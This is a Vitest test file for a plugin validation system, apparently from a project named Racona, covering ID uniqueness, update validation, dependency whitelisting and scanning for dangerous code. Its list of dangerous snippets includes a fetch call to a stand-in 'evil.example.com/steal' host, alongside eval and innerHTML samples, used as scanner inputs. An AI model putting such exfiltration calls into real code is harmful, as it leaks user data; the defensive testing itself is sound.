// @vitest-environment node
/**
 * Tesztek a PluginValidator ID-egyediség kezeléséhez és a frissítési validációhoz.
 *
 * Telepítéskor a duplikált ID azonnal elutasít; frissítéskor (skipIdUniqueness) az ID
 * egyediség kimarad, de minden más ellenőrzés (kód szkennelés, függőségek, entry point,
 * ikon) lefut.
 */

import { describe, it, expect, vi, beforeEach, beforeAll, afterAll } from 'vitest';
import fc from 'fast-check';
import AdmZip from 'adm-zip';
import fs from 'fs';
import os from 'os';
import path from 'path';

// --- Mockok ---

const errorCodes = vi.hoisted(() =>
	Object.fromEntries(
		[
			'INVALID_ZIP',
			'MISSING_MANIFEST',
			'INVALID_MANIFEST',
			'DANGEROUS_CODE_PATTERN',
			'INVALID_DEPENDENCY',
			'DUPLICATE_PLUGIN_ID',
			'VERSION_NOT_GREATER',
			'INVALID_PACKAGE',
			'PLUGIN_NOT_FOUND'
		].map((code) => [code, code])
	)
);

vi.mock('@racona/database', () => ({
	PluginErrorCode: errorCodes,
	apps: { id: 'id_col', appId: 'app_id_col', pluginVersion: 'plugin_version_col' },
	pluginLogs: {}
}));

vi.mock('drizzle-orm', () => ({
	eq: vi.fn((col, val) => ({ op: 'eq', col, val }))
}));

vi.mock('$lib/env', () => ({ env: {} }));

// db.select().from().where().limit() → mockDbRows()
const mockDbRows = vi.hoisted(() => vi.fn());
const mockSelect = vi.hoisted(() => vi.fn());
vi.mock('$lib/server/database', () => ({
	default: {
		select: (...args: unknown[]) => {
			mockSelect(...args);
			return {
				from: () => ({ where: () => ({ limit: async () => mockDbRows() }) })
			};
		}
	}
}));

// A PluginUpdater egyéb függőségei (a validációhoz nem kellenek)
vi.mock('../utils/filesystem', () => ({
	getPluginDir: vi.fn(),
	getBackupPath: vi.fn(),
	copyDir: vi.fn(),
	ensureDir: vi.fn(),
	removeDir: vi.fn(),
	PLUGIN_DIRS: {}
}));
vi.mock('../utils/server-snapshot', () => ({ invalidateServerSnapshots: vi.fn() }));
vi.mock('$lib/server/scheduler/registry', () => ({
	readInstalledManifest: vi.fn(),
	syncPluginJobs: vi.fn()
}));
vi.mock('../installer/PluginInstaller', () => ({ pluginInstaller: {} }));

import { PluginValidator } from './PluginValidator';
import { PluginUpdateValidator } from '../installer/PluginUpdater';

// --- Segédfüggvények ---

const PLUGIN_ID = 'test-plugin';

let tmpDir: string;
let zipCounter = 0;

function baseManifest(overrides: Record<string, unknown> = {}) {
	return {
		id: PLUGIN_ID,
		name: 'Test Plugin',
		version: '2.0.0',
		description: 'Test plugin',
		author: 'Tester <tester@example.com>',
		entry: 'index.js',
		icon: 'Puzzle',
		permissions: [],
		...overrides
	};
}

function buildPackage(
	files: Record<string, string>,
	manifestOverrides: Record<string, unknown> = {}
): string {
	const zip = new AdmZip();
	zip.addFile('manifest.json', Buffer.from(JSON.stringify(baseManifest(manifestOverrides))));
	for (const [name, content] of Object.entries(files)) {
		zip.addFile(name, Buffer.from(content));
	}
	const filePath = path.join(tmpDir, `pkg-${zipCounter++}.zip`);
	zip.writeZip(filePath);
	return filePath;
}

const CLEAN_ENTRY = 'export default function main() { return 42; }\n';

const DANGEROUS_SNIPPETS = [
	'eval("1 + 1");',
	'const f = new Function("return 1");',
	'el.innerHTML = userInput;',
	'document.write("x");',
	'fetch("https://evil.example.com/steal");',
	'const x = new XMLHttpRequest();'
];

beforeAll(() => {
	tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'plugin-validator-test-'));
});

afterAll(() => {
	fs.rmSync(tmpDir, { recursive: true, force: true });
});

beforeEach(() => {
	vi.clearAllMocks();
	vi.spyOn(console, 'log').mockImplementation(() => {});
	vi.spyOn(console, 'error').mockImplementation(() => {});
});

// --- Tesztek ---

describe('PluginValidator.validate — telepítés', () => {
	it('duplikált ID esetén DUPLICATE_PLUGIN_ID hibával azonnal visszatér', async () => {
		mockDbRows.mockReturnValue([{ id: 1 }]);
		const pkg = buildPackage({ 'index.js': 'eval("x");' });

		const report = await new PluginValidator().validate(pkg);

		expect(report.valid).toBe(false);
		expect(report.errors.map((e) => e.code)).toEqual(['DUPLICATE_PLUGIN_ID']);
		expect(mockSelect).toHaveBeenCalledTimes(1);
	});

	it('egyedi ID és tiszta csomag esetén érvényes', async () => {
		mockDbRows.mockReturnValue([]);
		const pkg = buildPackage({ 'index.js': CLEAN_ENTRY });

		const report = await new PluginValidator().validate(pkg);

		expect(report.errors).toEqual([]);
		expect(report.valid).toBe(true);
	});
});

describe('PluginValidator.validate — skipIdUniqueness', () => {
	beforeEach(() => {
		// Az ID már létezik: ha mégis lekérdeznénk, DUPLICATE_PLUGIN_ID lenne
		mockDbRows.mockReturnValue([{ id: 1 }]);
	});

	it('nem kérdezi le az ID egyediséget, és tiszta csomagot elfogad', async () => {
		const pkg = buildPackage({ 'index.js': CLEAN_ENTRY });

		const report = await new PluginValidator().validate(pkg, { skipIdUniqueness: true });

		expect(mockSelect).not.toHaveBeenCalled();
		expect(report.valid).toBe(true);
		expect(report.manifest?.id).toBe(PLUGIN_ID);
	});

	it('lefuttatja a kód szkennert', async () => {
		const pkg = buildPackage({ 'index.js': 'eval("alert(1)");' });

		const report = await new PluginValidator().validate(pkg, { skipIdUniqueness: true });

		expect(report.valid).toBe(false);
		expect(report.errors.map((e) => e.code)).toContain('DANGEROUS_CODE_PATTERN');
	});

	it('lefuttatja a függőség fehérlistát', async () => {
		const pkg = buildPackage({ 'index.js': CLEAN_ENTRY }, { dependencies: { lodash: '^4.0.0' } });

		const report = await new PluginValidator().validate(pkg, { skipIdUniqueness: true });

		expect(report.valid).toBe(false);
		expect(report.errors.map((e) => e.code)).toContain('INVALID_DEPENDENCY');
	});

	it('ellenőrzi az entry point létezését', async () => {
		const pkg = buildPackage({ 'other.js': CLEAN_ENTRY });

		const report = await new PluginValidator().validate(pkg, { skipIdUniqueness: true });

		expect(report.valid).toBe(false);
		expect(report.errors).toContainEqual(
			expect.objectContaining({ code: 'INVALID_MANIFEST', field: 'entry' })
		);
	});

	it('ellenőrzi az ikon fájlt', async () => {
		const pkg = buildPackage({ 'index.js': CLEAN_ENTRY }, { icon: 'icon.png' });

		const report = await new PluginValidator().validate(pkg, { skipIdUniqueness: true });

		expect(report.warnings.map((w) => w.code)).toContain('ICON_NOT_FOUND');
	});
});

describe('PluginUpdateValidator.validateForUpdate', () => {
	beforeEach(() => {
		mockDbRows.mockReturnValue([{ id: 1, pluginVersion: '1.0.0' }]);
	});

	it('tiszta, nagyobb verziójú csomagot elfogad', async () => {
		const pkg = buildPackage({ 'index.js': CLEAN_ENTRY });

		const report = await new PluginUpdateValidator().validateForUpdate(pkg, PLUGIN_ID);

		expect(report.errors).toEqual([]);
		expect(report.valid).toBe(true);
		expect(report.manifest?.version).toBe('2.0.0');
	});

	it('nem engedélyezett függőséget elutasít', async () => {
		const pkg = buildPackage({ 'index.js': CLEAN_ENTRY }, { dependencies: { axios: '^1.0.0' } });

		const report = await new PluginUpdateValidator().validateForUpdate(pkg, PLUGIN_ID);

		expect(report.valid).toBe(false);
		expect(report.errors.map((e) => e.code)).toContain('INVALID_DEPENDENCY');
	});

	it('hiányzó entry pointot elutasít', async () => {
		const pkg = buildPackage({ 'other.js': CLEAN_ENTRY });

		const report = await new PluginUpdateValidator().validateForUpdate(pkg, PLUGIN_ID);

		expect(report.valid).toBe(false);
		expect(report.errors).toContainEqual(
			expect.objectContaining({ code: 'INVALID_MANIFEST', field: 'entry' })
		);
	});

	it('Property: veszélyes kódmintát tartalmazó frissítést mindig elutasít', async () => {
		await fc.assert(
			fc.asyncProperty(
				fc.constantFrom(...DANGEROUS_SNIPPETS),
				fc.constantFrom('index.js', 'lib/helper.js', 'components/App.svelte', 'server/api.ts'),
				async (snippet, fileName) => {
					const files: Record<string, string> = { 'index.js': CLEAN_ENTRY };
					files[fileName] = `${fileName === 'index.js' ? CLEAN_ENTRY : ''}${snippet}\n`;
					const pkg = buildPackage(files);

					const report = await new PluginUpdateValidator().validateForUpdate(pkg, PLUGIN_ID);

					expect(report.valid).toBe(false);
					expect(report.errors.map((e) => e.code)).toContain('DANGEROUS_CODE_PATTERN');
					expect(report.errors.map((e) => e.code)).not.toContain('DUPLICATE_PLUGIN_ID');
				}
			),
			{ numRuns: 30 }
		);
	});
});
